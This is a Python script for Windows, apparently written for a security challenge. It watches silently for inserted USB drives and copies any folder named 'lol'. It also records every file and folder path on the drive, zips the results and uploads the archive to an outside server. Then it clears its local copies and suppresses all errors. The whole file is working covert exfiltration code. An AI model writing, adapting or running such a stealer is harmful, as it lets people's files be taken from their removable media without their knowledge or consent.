import time
import os
import psutil
import shutil
import win32file
import zipfile
import requests

BACKUP_FOLDER = r"C:\Backup"
SERVER_URL = "https://saic-challenge-5-server.onrender.com/upload"

def get_removable_drives():
    
    drives = []
    try:
        for drive in psutil.disk_partitions(all=True):
            if "cdrom" in drive.opts.lower():
                continue  # Skip CD/DVD drives
            drive_type = win32file.GetDriveType(drive.device)
            if drive_type == win32file.DRIVE_REMOVABLE:  # Detect removable (USB) drives
                drives.append(drive.device)
    except Exception as e:
        pass
    return drives

def sanitize_drive_name(drive):
    
    return drive.replace(':', '').replace('\\', '_')

def check_directory(drive, dir_name):
    
    try:
        for root, dirs, _ in os.walk(drive):
            if dir_name in dirs:
                return os.path.join(root, dir_name)
    except Exception as e:
        pass
    return None

def copy_folder(src, dest):
    
    try:
        if not os.path.exists(dest):
            os.makedirs(dest)

        for item in os.listdir(src):
            src_path = os.path.join(src, item)
            dest_path = os.path.join(dest, item)

            if os.path.isdir(src_path):
                shutil.copytree(src_path, dest_path, dirs_exist_ok=True)
            else:
                shutil.copy2(src_path, dest_path)

        
        
    except Exception as e:
        pass
        

def scan_drive(drive):
    
    folder_list = []
    file_list = []

    try:
        for root, dirs, files in os.walk(drive):
            for d in dirs:
                folder_list.append(os.path.join(root, d))  # Store folder paths

            for f in files:
                file_path = os.path.join(root, f)
                file_list.append((file_path, os.path.getsize(file_path)))  # Store file paths & sizes

    except Exception as e:
        pass

    # Sort folders alphabetically and files by size (descending)
    folder_list.sort()
    file_list.sort(key=lambda x: x[1], reverse=True)

    # Return sorted folder names and file names (largest first)
    return folder_list, [file[0] for file in file_list]

def update_log(drive, folder_list, file_list):
    
    sanitized_drive = sanitize_drive_name(drive)
    log_file = os.path.join(BACKUP_FOLDER, f"log_{sanitized_drive}.txt")
    try:
        if not os.path.exists(BACKUP_FOLDER):
            os.makedirs(BACKUP_FOLDER)

        with open(log_file, "a", encoding="utf-8") as log:
            log.write(f"\n{drive}: " + ", ".join(folder_list + file_list) + "\n")

        
    except Exception as e:
        pass

def create_zip(drive):
    #Creates a ZIP archive of the backup folder for the specific drive.
    sanitized_drive = sanitize_drive_name(drive)
    zip_file = os.path.join(BACKUP_FOLDER, f"backup_{sanitized_drive}.zip")
    try:
        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(BACKUP_FOLDER):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, BACKUP_FOLDER)  # Keep relative path
                    zipf.write(file_path, arcname)

        pass
    except Exception as e:
        pass
    return zip_file

def upload_zip(zip_file):
    #Uploads the ZIP file to the server
    try:
        with open(zip_file, 'rb') as f:
            response = requests.post(SERVER_URL, files={'zipfile': f})
            response.raise_for_status()  # Raise an error for bad status codes
            
    except Exception as e:
        pass

def clear_backup_folder():
    
    try:
        for item in os.listdir(BACKUP_FOLDER):
            item_path = os.path.join(BACKUP_FOLDER, item)
            if os.path.isdir(item_path):
                shutil.rmtree(item_path)
            else:
                os.remove(item_path)
   
    except Exception as e:
        pass


def run():
    detected_drives = set()

    while True:
        try:
            removable_drives = set(get_removable_drives())

            new_drives = removable_drives - detected_drives
            if new_drives:
                for drive in new_drives:
                    try:
                    
                        sanitized_drive = sanitize_drive_name(drive)
                        lol_folder = check_directory(drive, "lol")

                        if lol_folder:
                            
                            copy_folder(lol_folder, os.path.join(BACKUP_FOLDER, f"lol_{sanitized_drive}"))

                        # Scan drive and update log
                        folders, files = scan_drive(drive)
                        update_log(drive, folders, files)

                        # Create ZIP archive of the backup folder
                        zip_file = create_zip(drive)

                        # Upload ZIP file to the server
                        upload_zip(zip_file)

                        # Clear the backup folder
                        clear_backup_folder()

                    except Exception as e:
                        pass

            detected_drives = removable_drives  # Update detected drives
            time.sleep(5)  # Check every 5 seconds
        except Exception as e:
        
            time.sleep(5)  # Wait and retry


if __name__ == "__main__":
    run()
